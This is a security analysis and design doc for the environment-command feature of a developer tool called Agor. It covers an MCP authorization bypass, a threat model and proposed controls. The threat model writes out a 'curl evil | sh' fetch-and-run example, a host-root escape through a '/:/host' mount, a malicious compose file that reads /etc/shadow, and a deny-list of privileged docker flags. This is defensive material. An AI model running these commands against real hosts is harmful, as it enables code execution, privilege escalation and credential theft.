# Env-Command Security Analysis

**Status:** Analysis + design doc. Scope now locked (see below); implementation
proceeding in this worktree. This doc will be deleted when the PR lands — git
history preserves it.
**Scope:** Agor "environment commands" — named shell commands per worktree
(`start_command`, `stop_command`, `nuke_command`, `logs_command`) triggered over
REST/MCP/CLI and executed on the daemon host.

---

## Final PR Scope (locked)

One PR on branch `env-commands-security-analysis`, landing in this order:

| # | Item | Commit shape |
|---|---|---|
| E | Fix strict-mode `envFilePath` exec bug (shell-string commands truncated to single-arg exec) — new `shell` option on `buildSpawnArgs` + tests | `fix(unix): shell-interpret env commands under impersonation with secrets` |
| A | `execution.managed_envs_minimum_role` config (`none\|viewer\|member\|admin\|superadmin`, default `member`), service-level enforcement, drop route-layer `ROLES.ADMIN` hardcode | `feat(env): configurable min-role gate for env-command triggers` |
| C | `execution.env_commands.deny_tokens` — host-root footgun blocklist at define-time + trigger-time | `feat(env): argv-token deny-list for env commands` |
| D | Structured audit log per trigger (`worktree_id`, `user_id`, `caller`, `argv_hash`, exit status) | `feat(env): structured audit log for env-command triggers` |
| B | New top-level `worktrees:` config section with `others_can_default` / `others_fs_access_default`, wired into `worktreeRepository.create` | `feat(config): worktrees defaults for others_can and others_fs_access` |
| F | `{{host_ip_address}}` Handlebars template variable — auto-detect primary non-loopback IPv4 with optional `daemon.host_ip_address` override | `feat(templates): host_ip_address variable for env-command templates` |
| G | UI: render env commands read-only for non-admins; render triggers disabled-with-tooltip when user below `managed_envs_minimum_role` | `feat(ui): role-aware env command visibility` |
| H | Fix `.agor.yml` import/export to operate on the active worktree path, not the repo folder | `fix(config): agor.yml import/export operates on worktree path` |

**Behavioral change worth flagging in PR description:** A drops the hardcoded
route-level `ROLES.ADMIN` gate on `POST /worktrees/:id/{start,stop,restart,nuke}`.
The new default `managed_envs_minimum_role: member` means deployments that
relied on the previous implicit admin-only trigger will see members able to
trigger. This matches the intended UX per product direction, and admins can
set `admin` or `superadmin` to keep the old behavior. Flag in upgrade notes.

**Dropped from scope:** auto-reingesting `.agor.yml` (local can diverge from
repo intentionally); separate `managed_envs_minimum_worktree_permission`
config (add in follow-up once A has bedded in).

**Deferred (not this PR):** argv-prefix allow-list, rate limiting, rootless
docker runner process, compose-hash pinning, fixing stale SQLite CHECK
constraint drift for `others_can` (migration 0034 not applied to local DB).

---

## ⚠️ CRITICAL FINDING — FLAG UP FRONT

**REST and MCP have inconsistent trigger gates, and MCP is effectively ungated.**
This is a bug regardless of what the "right" role ends up being (see §4 —
product direction is to keep member-trigger working, not tighten everything
to admin-only).

- REST routes (`POST /worktrees/:id/{start,stop,restart,nuke}`) require
  `ROLES.ADMIN` at
  `apps/agor-daemon/src/register-routes.ts:2079,2098,2117,2136`.
- **MCP tools** (`agor_environment_start`, `_stop`, `_nuke`) call the service
  methods directly at
  `apps/agor-daemon/src/mcp/tools/environment.ts:23,57,176` — passing
  `ctx.baseServiceParams`, which carries the user's real role but is **not
  checked**.
- The service methods themselves (`startEnvironment` / `stopEnvironment` /
  `nukeEnvironment` at `apps/agor-daemon/src/services/worktrees.ts:870,1021,1138`)
  have **no role check** of their own. Their only gate is the internal
  `this.get(id, params)` — which is `view`-level (any authenticated user in
  RBAC-disabled mode, any user with `view` permission on the worktree in
  RBAC-enabled mode).
- MCP domain tier filtering (`readOnlyProxy` at `.../mcp/server.ts:348`) only
  strips non-readonly tools when the `worktrees` domain is configured
  `readonly`. In the default `on` tier, start/stop/nuke are fully exposed.

**Impact (open-access, `worktree_rbac: false`):** any authenticated user with a
valid MCP session token (minted for every agentic session) can execute the
admin-defined `start_command` / `stop_command` / `nuke_command` of any worktree
as the daemon user (simple mode) or as the worktree creator's unix user (strict
mode). Scoped only by what admin put in those fields — which, given the
product direction below, is exactly the gate we want to be *intentional* about,
not accidental.

**Impact (`worktree_rbac: true`):** restricted to users with `view+` on the
worktree. New worktrees default to `others_can: 'session'` at the repository
layer (`packages/core/src/db/repositories/worktrees.ts:145`), so the typical
team collaborator can `view` and therefore MCP-trigger today.

**Recommended fix (aligned with product direction):** pick a single source of
truth for the trigger role — `execution.managed_envs_minimum_role` config,
default `member` — and enforce it on *both* paths:

- Inside `startEnvironment` / `stopEnvironment` / `restartEnvironment` /
  `nukeEnvironment`, assert the caller's role meets the configured minimum.
- Replace the hardcoded `ROLES.ADMIN` on the REST routes with the same
  config-driven role, so REST and MCP agree.
- A value of `none` on the config disables the feature entirely (kill-switch
  folded into the same enum).

This keeps member-trigger working (the intended UX), makes the MCP path
explicit, and removes the REST/MCP inconsistency. Details in §3 and §4.

---

## 1. Current State

### 1.1 Where env commands live

**Repo-level templates** — Handlebars templates on `repos.data.environment_config`:
`up_command`, `down_command`, `nuke_command`, `logs_command`,
`health_check.url_template`, `app_url_template`.
- `packages/core/src/db/schema.postgres.ts:436-443`
- `packages/core/src/db/schema.sqlite.ts:428-435`
- Ingested from `.agor.yml` at repo creation
  (`packages/core/src/config/agor-yml.ts:18-34`).

**Worktree-level resolved commands** — materialised columns on `worktrees`:
`start_command`, `stop_command`, `nuke_command`, `logs_command`,
`health_check_url`, `app_url`.
- `packages/core/src/db/schema.postgres.ts:480-485`
- `packages/core/src/db/schema.sqlite.ts:472-477`

### 1.2 Define / edit path (admin-only — confirmed)

`PATCH /repos/:id` and `PATCH /worktrees/:id` both run
`requireAdminForEnvConfig()` before hitting the service:
`apps/agor-daemon/src/register-hooks.ts:514-516, 540-543`.

Hook body at `apps/agor-daemon/src/utils/authorization.ts:54-97`: scans the
patch payload for any of `environment_config`, `start_command`, `stop_command`,
`nuke_command`, `logs_command`, `health_check_url`, `app_url` and calls
`ensureMinimumRole(params, ROLES.ADMIN, ...)`. Internal daemon calls
(`!params?.provider`) and service accounts bypass — standard Feathers pattern.

✅ **Define gate is real, at the service-hook layer, and applies to both
repo-level templates and worktree-level materialised commands.**

### 1.3 Trigger path (broken — see critical finding)

REST (gated):
- `POST /worktrees/:id/start` — `ROLES.ADMIN`
- `POST /worktrees/:id/stop` — `ROLES.ADMIN`
- `POST /worktrees/:id/restart` — `ROLES.ADMIN`
- `POST /worktrees/:id/nuke` — `ROLES.ADMIN`
- `GET  /worktrees/:id/health` — `ROLES.MEMBER`
  (`apps/agor-daemon/src/register-routes.ts:2065-2156`)

MCP (ungated): see critical finding above.

CLI: `apps/agor-cli/src/commands/worktree/env/{start,stop,restart,status}.ts`
calls the daemon via the service layer — inherits the daemon's Feathers
authentication; role enforcement depends on whether it goes through the route
(ADMIN) or direct service call. Needs one more read to pin down which path it
takes, but the CLI is lower-risk because it runs as the daemon user already.

### 1.4 Executor: what actually runs

Core spawner: `packages/core/src/unix/environment-command-spawn.ts:52-127`.
Uses Node `child_process.spawn()`. Two shapes:

- **Simple mode** (`unix_user_mode: simple`, default):
  `spawn(command, [], { shell: true, cwd: worktree.path, env: <merged> })`.
  The entire admin-defined `command` string is passed to `/bin/sh -c`.
  Runs as the daemon user (`agorpg`).

- **Insulated / strict modes** (via
  `packages/core/src/unix/run-as-user.ts:203-296`):
  `spawn('sudo', ['-n', '-u', <user>, 'bash', '-c', innerScript])` where
  `innerScript` optionally sources a per-run env file, then `exec`s the admin
  command. Requires passwordless sudo (`-n`) for `agorpg → <user>`.
  - `insulated`: `<user>` = `execution.executor_unix_user` (shared executor).
  - `strict`: `<user>` = `worktree.created_by`'s `unix_username` (per-user).

**Critical implementation note for the threat model:** in all modes, the
spawned command's `cwd` is `worktree.path`. The shell interprets the admin
command string, but the actual behaviour (what containers start, what ports
publish, what volumes mount) is governed by whatever the command *reads* from
that directory — typically `docker-compose.yml`, `Dockerfile`, `.env`, etc.
The triggering user (or anyone who can push to the branch) controls that
content.

### 1.5 Docker group question

Not explicitly wired by Agor — it depends on host setup. In the common
docker-compose case:

- **Simple mode:** daemon user must be in the `docker` group to run
  `docker compose`. Being in `docker` is effectively root-equivalent on the
  host (`docker run -v /:/host …` trivially escalates).
- **Strict mode:** each worktree-creator unix user must be in `docker` for
  their compose commands to work. This hands root-equivalent to every human
  who creates a worktree. This is **worse than simple mode for most threat
  models**, because "user per human" multiplies the number of host-root
  principals.
- **Insulated mode:** only the shared `executor_unix_user` needs `docker`.
  That is the sane default for docker-based stacks.

The sudoers file at `docker/sudoers/agor-daemon.sudoers` scopes `sudo -u` but
does not scope `docker`.

### 1.6 Audit & logging

No structured audit trail. Only `console.log` at
`apps/agor-daemon/src/services/worktrees.ts:907, 1042, 1161, 1390`
(start/stop/nuke/logs). Output goes to daemon stdout/stderr. No DB table, no
Feathers event, no webhook.

Also no rate limiting or quota. A tight loop of `agor_environment_nuke` calls
is rate-limited only by how fast containers can start/stop.

### 1.7 Existing config surface

Only the general execution knobs: `unix_user_mode`, `executor_unix_user`,
`worktree_rbac`, `allow_web_terminal`
(`packages/core/src/config/types.ts:218-279`). **No env-command-specific
config keys today** — no kill-switch, no allow-list, no deny-list.

---

## 2. Threat Model

Open-access mode (`worktree_rbac: false`, `unix_user_mode: simple`) is the
baseline Max expressed worry about. That's Mode 1 in `CLAUDE.md`.

### 2.1 External unauthenticated

- Env-command endpoints all sit behind `requireAuth` (REST) or
  `validateSessionToken` (MCP). Confirmed via route/middleware registration.
  No path to trigger without credentials.
- Indirect risk: if daemon is exposed to the public internet without TLS/auth
  hardening (out of scope here), any authenticated-user attack below applies.

### 2.2 Authenticated non-admin `member`

In open-access mode, a plain `member` with a valid MCP session token:

| Attack | Works today? | Control |
|---|---|---|
| `POST /worktrees/:id/start` via REST | ❌ blocked (ADMIN) | Route hook |
| `agor_environment_start` via MCP | ✅ **yes** | None (critical finding) |
| `agor_environment_nuke` via MCP | ✅ **yes** | None (critical finding) |
| Edit `start_command` via REST/UI | ❌ blocked (ADMIN) | `requireAdminForEnvConfig` |
| Push a malicious `docker-compose.yml` to the branch, then wait for admin to `start` | ✅ yes, by design | None — see §2.4 |
| Loop `nuke` to burn CPU/disk | ✅ yes (MCP path) | None |

**Worst case in open-access mode:** member gets arbitrary shell as the daemon
user, within whatever the admin-defined `start_command` does. If that's
`docker compose up -d`, the member can edit `docker-compose.yml` first and the
compose file gets interpreted by daemon's docker — which (if daemon is in the
`docker` group) equals host root.

### 2.3 Authenticated non-admin with RBAC on

Same as §2.2 but gated by `view+` on the specific worktree. The effective
default for new worktrees is `others_can: 'session'` (repository-layer
default, `packages/core/src/db/repositories/worktrees.ts:145`; the SQLite
schema column default is `'view'` but is overridden on insert). Either way,
`view` is the weakest tier that still reaches the MCP trigger path, and every
team collaborator has at least that.

**Important product framing (per Max):** the design intent is that
`member`-tier users *should* be able to start/stop envs. It's admins' job to
configure commands that are safe to trigger under that trust model —
rootless/remote (external k8s, EC2 trigger), or locked-down compose. The
concern is not "member triggered something" but "admin configured a command
that shouldn't be member-triggerable". The MCP bypass matters because it
removes the admin's ability to *choose* the gate.

### 2.4 Triggering user controls the checkout — escalation through commit

Even if the MCP gate were fixed and only admins could trigger, a non-admin
with commit access to the worktree branch can still escalate via the compose
file or equivalent. The admin configured `docker compose up`; the worktree
owner commits a `docker-compose.yml` with
`volumes: ["/:/host"]` + a shell script that reads `/etc/shadow`.

**This is fundamental:** env commands execute code from the checkout.
Sanitising the command string does not sanitise the working tree. The only
real mitigations are:

1. Treat "trigger env command" as equivalent to "execute arbitrary code from
   this branch" and gate it at the same level as branch-write.
2. Sandbox the execution (rootless docker/podman, namespaces, seccomp).
3. Pin the compose file / Dockerfile to a known-good revision and refuse to
   run if the current tree differs.

Option 3 is where "argv allow-list" arguments lose force — the argv is fine,
the payload is the filesystem.

### 2.5 Admin (non-malicious) — foot-guns

- `nuke_command` typo that deletes the wrong volumes.
- Committing `.agor.yml` with a `start: curl evil | sh`-style command; future
  worktrees inherit it.
- Flipping `worktree_rbac: false` expecting "personal instance" semantics,
  forgetting there are provisioned members.

### 2.6 Compromised admin account

Instant arbitrary code execution on the host. The only defense-in-depth Agor
could realistically add is:

- Logging / audit so compromise is detectable after the fact.
- A second-factor / out-of-band approval on `nuke` (nuke-confirm tokens).
- Making admin env-command edits append-only (no silent edits of existing
  command strings after review) — a build-time config vs. runtime config
  split.

These are all "Consider" tier, not blocking.

---

## 3. Proposed Control Surface

Ordered by value-per-effort. Sizes: S = < day, M = week-ish, L = multi-week.

### 3.1 Single trigger-role enum with kill-switch baked in (S, **blocking**)

One config knob covers both the kill-switch and the role gate:

```
execution.managed_envs_minimum_role: 'none' | 'member' | 'admin' | 'superadmin'
# Default: 'member'
```

Semantics:

- `none` → feature off. REST routes return 404, MCP tools are not registered,
  UI hides start/stop/nuke buttons, CLI subcommands fail with a clear message.
- `member` / `admin` / `superadmin` → caller must meet this minimum role.
  Checked uniformly on REST, MCP, and CLI entry points.

Implementation:

- Add a shared helper, e.g. `assertCanTriggerEnvCommand(params, config)`, used
  at the top of `startEnvironment` / `stopEnvironment` / `restartEnvironment` /
  `nukeEnvironment` (`apps/agor-daemon/src/services/worktrees.ts:870,1021,1117,1138`).
- Replace the hardcoded `ROLES.ADMIN` on the four REST routes
  (`register-routes.ts:2079,2098,2117,2136`) with a dynamic role derived from
  the same config — or just drop the route-level role check and rely on the
  service-level assertion (single source of truth).
- When `none`, skip route + MCP tool registration entirely at startup, rather
  than registering-then-refusing.

This simultaneously:
- Fixes the REST/MCP inconsistency (one gate, both paths).
- Gives admins the knob they need to loosen (default `member`) or tighten
  (`admin`) without code changes.
- Provides the kill-switch (`none`).
- Preserves the product intent that members can trigger safe env commands.

### 3.2 Worktree-permission tiering (S, pairs with 3.1)

RBAC-on deployments already gate `.get()` by `others_can`. Additionally require
at least `session` on the worktree to trigger (vs today's effective `view`),
so "can view this worktree in the UI" does not imply "can run its env
commands." Cheap, sensible.

Config:
```
execution.managed_envs_minimum_worktree_permission: 'view' | 'session' | 'prompt' | 'all'
# Default: 'session'
```

Ignored when `worktree_rbac: false`.

### 3.3 Keep define-side gate as-is (no change)

`requireAdminForEnvConfig` at `apps/agor-daemon/src/utils/authorization.ts:74`
already correctly restricts command authoring to admins. Given the product
direction ("admins curate safe commands"), this is the right default and
should stay. Worth adding a config override only if a deployment mode justifies
it; not blocking.

### 3.4 Argv-token deny-list (S)

Implement an unambiguous blocklist first, allow-list second. Deny-list
rejects the command at define-time **and** at trigger-time if tokens like:

- `--privileged`
- `--network=host` / `--network host`
- `-v /:`, `--mount … source=/ …` (bind root)
- `--cap-add=ALL`, `--cap-add=SYS_ADMIN`
- `--user 0` / `--user root`
- Backticks / `$(…)` in the command string (cheap hedge, many false positives
  on legitimate interpolation — make it a warning not a block).

Token-matching (splitting argv) is safer than regex against a shell string.
Since we spawn `sh -c <string>`, we'd need to parse the string first (e.g. via
`shell-quote`) — acknowledge this is imperfect; documented best-effort.

Location: new utility in `packages/core/src/unix/env-command-validator.ts`,
called from `spawnEnvironmentCommand` and from `requireAdminForEnvConfig`.

### 3.5 Argv-prefix allow-list (M)

`execution.env_commands.allowed_prefixes: ["docker compose", "docker ps",
"pnpm ", "make "]`. Command must start with one of these after tokenisation.
Empty list = allow anything (backward compat). Pairs well with deny-list above.

### 3.6 Audit log (M)

New table `env_command_events(id, worktree_id, user_id, action, argv,
exit_code, started_at, ended_at, caller: rest|mcp|cli)`. Write at trigger and
at completion. Expose over `find` to admins only. Emit Feathers event so UI
can tail it.

Location: new repository + hook.

### 3.7 Checkout pinning / compose review (L)

Given §2.4, this is where real isolation lives. Options in increasing order
of effort:

- Compute `sha256` of `docker-compose.yml` at admin-blessing time, store on
  worktree, refuse to `start` if current hash differs (forces re-bless after
  changes).
- Require `start` to run against a clean worktree at a specific ref.
- Render compose through a policy engine (conftest / rego) that rejects
  `privileged`, host networking, root bind mounts, etc.

All three are real work. Ship the first two only when there is a concrete
threat (multi-tenant).

### 3.8 Rootless docker / dedicated runner (L)

Mitigates docker-group = host-root.

- **Rootless docker / podman:** containers cannot escape to host. Operational
  cost: slower, networking gotchas, non-standard for many stacks. Ship as an
  *option*, not a requirement.
- **Dedicated runner process:** a small, auditable service that owns docker
  access, exposes a narrow API (`up(worktreeId, composePath)`) to the daemon,
  validates argv before forwarding. Daemon loses docker-group membership.
  Biggest security win available short of full container-host separation.

Location: new `apps/agor-runner/` package, out-of-band IPC.

### 3.9 Rate / quota (S)

`execution.env_commands.rate_limit_per_minute: 10` per user. Cheap. Blunts
`nuke`-loop denial of service. Low priority compared to the above.

---

## 4. Recommendation

Product intent (restated): **members should be able to fire up envs.** Admins
curate safe commands — ideally commands that *aren't* "docker compose up" on
a host-privileged daemon, but instead trigger remote infra (k8s apply, EC2
start), or run under rootless docker/podman. The security boundary is the
command string (admin-owned) + the executor's capabilities (ops-owned), not
"which role can press the button".

**Do now (this week, low risk):**

1. **Single trigger-role enum** (§3.1). Ship
   `execution.managed_envs_minimum_role` with values
   `none | member | admin | superadmin`, default `member`. Enforce at the
   *service method* level so both REST and MCP go through it. This closes
   the MCP bypass, collapses the kill-switch into the same config, and
   preserves the intended UX. Non-negotiable: the REST/MCP inconsistency is a
   bug regardless of what the eventual default role is.
2. **Worktree-permission tiering** (§3.2). Require `session+` on the worktree
   to trigger when RBAC is on. Cheap add-on once §3.1 lands.
3. **Minimal deny-list** (§3.4). Hard-block `--privileged`, `--network host`,
   `-v /:`, `--cap-add=ALL`, `--cap-add=SYS_ADMIN` tokens at define-time.
   Fail loud with a clear message pointing at the override config. Small
   surface, catches the obvious footguns admins can commit by mistake.
4. **Audit log (minimal)** (§3.6). Structured logger line per trigger with
   `worktree_id`, `user_id`, `caller ∈ {rest,mcp,cli}`, `argv_hash`, exit
   status. DB table can come in a follow-up; a log line is enough to
   post-mortem.

**Do next (next sprint, medium lift):**

5. **Argv-prefix allow-list** (§3.5). Default empty (backward compat).
   Recommended for paranoid instances: `["docker compose ", "kubectl ",
   "aws ec2 ", "pnpm ", "make "]`. Complements — doesn't replace — rootless
   execution.
6. **Full audit table** (§3.6) with UI surface admins can scan.
7. **Rate / quota** (§3.9). Cheap; blunts `nuke` loops.

**Consider (next quarter, big lift, only if justified):**

8. **Dedicated runner process** (§3.8). The real fix for docker-group-as-root.
   A small, auditable service that owns docker access and exposes a narrow
   API to the daemon; argv validation happens at the runner boundary. Daemon
   loses `docker` group membership entirely. This is how you *actually* make
   "member can trigger docker stacks" safe on a shared host. Worth scoping
   once there's a concrete need.
9. **Rootless docker / podman** as a supported, documented option (§3.8).
   Much smaller lift than a runner process; fits most teams.
10. **Compose-hash pinning** (§3.7). Only relevant when branch-write is not
    trusted — e.g., multi-tenant. Skip until there is a concrete threat.

**Not recommending:**

- **Regex-based argv filtering.** Bypassed in two lines. Token-level only.
- **Hardcoding trigger to `admin`.** Contradicts product intent. The whole
  point is to make member-trigger *explicit and configurable*, not forbid it.
- **Gating by unix mode.** Tempting to say "only allow member-trigger when
  `unix_user_mode: strict`", but admins with docker-group executor can run
  k8s/EC2 triggers safely under `simple`. The right axis is the command, not
  the unix mode.

**Will not fix structurally:** a compromised admin account is game-over. No
amount of env-command config hardens against that. Audit logging is the
compensating control.

---

## 5. `config.yaml` Draft

```yaml
execution:
  # Existing keys (unchanged)
  worktree_rbac: false
  unix_user_mode: simple         # simple | insulated | strict
  executor_unix_user: null
  allow_web_terminal: true

  # --- New: managed env-command controls ---

  # Single knob: role gate AND kill-switch.
  #   none       = feature disabled (REST 404, MCP tools unregistered, UI hides
  #                start/stop/nuke). Admin can still *edit* commands in DB for
  #                later enablement.
  #   member     = any authenticated user can trigger. Admins still curate
  #                commands (define-side gate unchanged). Default.
  #   admin      = admin+ only can trigger.
  #   superadmin = superadmin only (for locked-down instances).
  managed_envs_minimum_role: member

  # Additional worktree-permission gate, applied only when worktree_rbac: true.
  # Ignored otherwise. `session` = "can run sessions on this worktree" — a
  # reasonable floor for "can bounce this worktree's env".
  managed_envs_minimum_worktree_permission: session   # view | session | prompt | all

  env_commands:
    # Hard deny-list of argv tokens. Checked at define-time (command rejected,
    # admin sees a clear error) AND at trigger-time (spawn aborted). These are
    # the obvious host-root footguns that no admin should be committing by
    # accident.
    deny_tokens:
      - "--privileged"
      - "--network=host"
      - "--network host"
      - "--cap-add=ALL"
      - "--cap-add=SYS_ADMIN"
      - "--user=0"
      - "--user=root"
      # Bind-mount host root
      - "-v /:"
      - "--mount=type=bind,source=/,"

    # Soft allow-list. Empty = allow anything (after deny-list).
    # Command must start with one of these tokens after shell tokenisation.
    # Leave empty in typical dev/solo deployments. Worth setting on
    # team/prod instances:
    #   - "docker compose"
    #   - "kubectl"
    #   - "aws"
    #   - "pnpm"
    #   - "make"
    allowed_prefixes: []

    # Rate-limit triggers per user per minute. 0 = unlimited.
    rate_limit_per_minute: 0

    # Structured audit line per trigger. Recommended: always on.
    audit: true

    # When true, refuse to start if the pinned files differ from the hash
    # blessed at last admin review. Ops must re-bless after changes.
    # Only relevant when collaborators can push commits that the env
    # interprets (compose files, Dockerfiles, helm values, etc.). Skip for
    # dev/solo; consider for multi-tenant/prod.
    require_file_pin: false
    pinned_files:
      - "docker-compose.yml"
      - "docker-compose.override.yml"
```

Minimum set to merge in the "do now" step:
`managed_envs_minimum_role`, `env_commands.deny_tokens`, `env_commands.audit`.
The rest land with §3.2 / §3.5 / §3.6.

---

## Open Questions / Uncertainty

- **CLI trigger path.** I did not confirm whether `agor worktree env start`
  from CLI goes through the gated REST route or reaches into the service
  class directly. If it reaches in, same MCP-bypass bug applies. Worth a
  10-minute read of `apps/agor-cli/src/commands/worktree/env/start.ts` before
  shipping the fix. CLI is lower-risk because the CLI user is already on the
  daemon host, but still worth knowing.
- **Docker group membership by unix mode.** My analysis assumes a typical
  docker-compose deployment. Agor does not check or document this — an admin
  can configure a non-docker `start_command` and the docker-group discussion
  is moot. Worth a paragraph in the security docs clarifying that *if* you
  run docker stacks under `unix_user_mode: strict`, every human user ends up
  in `docker` and therefore root-equivalent.
- **MCP tool-list suppression when `env_commands.enabled: false`.** The
  `readOnlyProxy` pattern filters by annotation, not by name. A kill-switch
  needs a new filter path; trivial but not free.
- **Whether `requireAdminForEnvConfig` catches `.agor.yml` ingestion.** The
  hook fires on `PATCH /repos/:id`. Repo *creation* via
  `cloneRepository` / `addLocalRepository` ingests `.agor.yml` — if that goes
  through `create` on the repos service with `environment_config` in the
  payload, the hook catches it (it covers `create`). If it bypasses
  (server-side construction without the `provider` set), it would be treated
  as "internal" and skip the check — this is intended (admin-curated ingest)
  but worth verifying that no user-initiated path sneaks through. I believe
  it's fine; flagging because I did not trace every codepath.
